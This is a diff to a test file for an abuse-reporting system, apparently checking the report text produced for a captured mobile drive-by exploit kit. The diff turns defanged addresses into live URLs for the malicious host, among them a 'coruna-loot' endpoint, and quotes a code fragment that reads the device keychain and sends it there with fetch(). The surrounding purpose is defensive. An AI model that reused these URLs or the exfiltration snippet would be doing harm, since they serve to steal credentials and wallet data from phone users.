@@ -151,12 +151,12 @@ describe("a mobile-only drive-by exploit kit (production case 377486973465530391
 			"The page attacks its visitors' devices without any action from them (a drive-by exploit): a frame on it that no visitor can see runs an exploit loader, and what the visitor sees is only a decoy.",
 			"The page turns desktop visitors away to a phone; it was captured as Safari on an iPhone (iOS 18.6.2).",
 			`Visitors reach the page through the site's own earlier pages: opening ${PAGE} on a phone (Safari on an iPhone (iOS 18.6.2)), since it turns desktop visitors away.`,
-			`The hidden frame is hxxps://92haoyun[.]icu/gooll/gooll.html (hidden by 0×0 size; its document is ${CORUNA_LOADER.length} bytes, SHA-256 ${"c".repeat(64)}).`,
+			`The hidden frame is https://92haoyun.icu/gooll/gooll.html (hidden by 0×0 size; its document is ${CORUNA_LOADER.length} bytes, SHA-256 ${"c".repeat(64)}).`,
 			"Its code reads the visitor's operating system version from the browser (iPhone OS, CPU OS) to choose what to load.",
 			"Its code downloads further code and runs it.",
-			"It loads these files: hxxps://92haoyun[.]icu/pe/0cb19f768eb8cd92.js, hxxps://92haoyun[.]icu/pe_main.js?v=1762531200000, hxxps://92haoyun[.]icu/native_bridge.js.",
-			"It sends keychain, wallet data from the device to hxxps://92haoyun[.]icu/coruna-loot; the capture saw this request go out.",
-			`Code in the hidden frame that shows it (URLs defanged): ${JSON.stringify("if (typeof readKeychain === 'function') { var kc = readKeychain(); fetch('hxxps://92haoyun[.]icu/coruna-loot', {")}.`,
+			"It loads these files: https://92haoyun.icu/pe/0cb19f768eb8cd92.js, https://92haoyun.icu/pe_main.js?v=1762531200000, https://92haoyun.icu/native_bridge.js.",
+			"It sends keychain, wallet data from the device to https://92haoyun.icu/coruna-loot; the capture saw this request go out.",
+			`Code in the hidden frame that shows it: ${JSON.stringify("if (typeof readKeychain === 'function') { var kc = readKeychain(); fetch('https://92haoyun.icu/coruna-loot', {")}.`,
 		]);
 		const evidence = (await AbuseRepository.getReportInput(report!.id))!.evidenceArtifacts.map(({ name }) => name);
 		expect(evidence).toEqual(["website-step2.png", "website.png", `hidden-frame-${"c".repeat(16)}.json`]);
@@ -181,7 +181,7 @@ describe("a mobile-only drive-by exploit kit (production case 377486973465530391
 		expect(website?.device).toBeUndefined();
 		const report = await AbuseRepository.getReportForSubmission(submission!.id);
 		expect(report?.description).not.toContain("captured as Safari");
-		expect(report?.description).toContain("It sends keychain, wallet data from the device to hxxps://92haoyun[.]icu/coruna-loot.");
+		expect(report?.description).toContain("It sends keychain, wallet data from the device to https://92haoyun.icu/coruna-loot.");
 	});
 
 	test("a phone that is shown nothing reportable leaves the case invalid, saying the hand-off was followed", async () => {
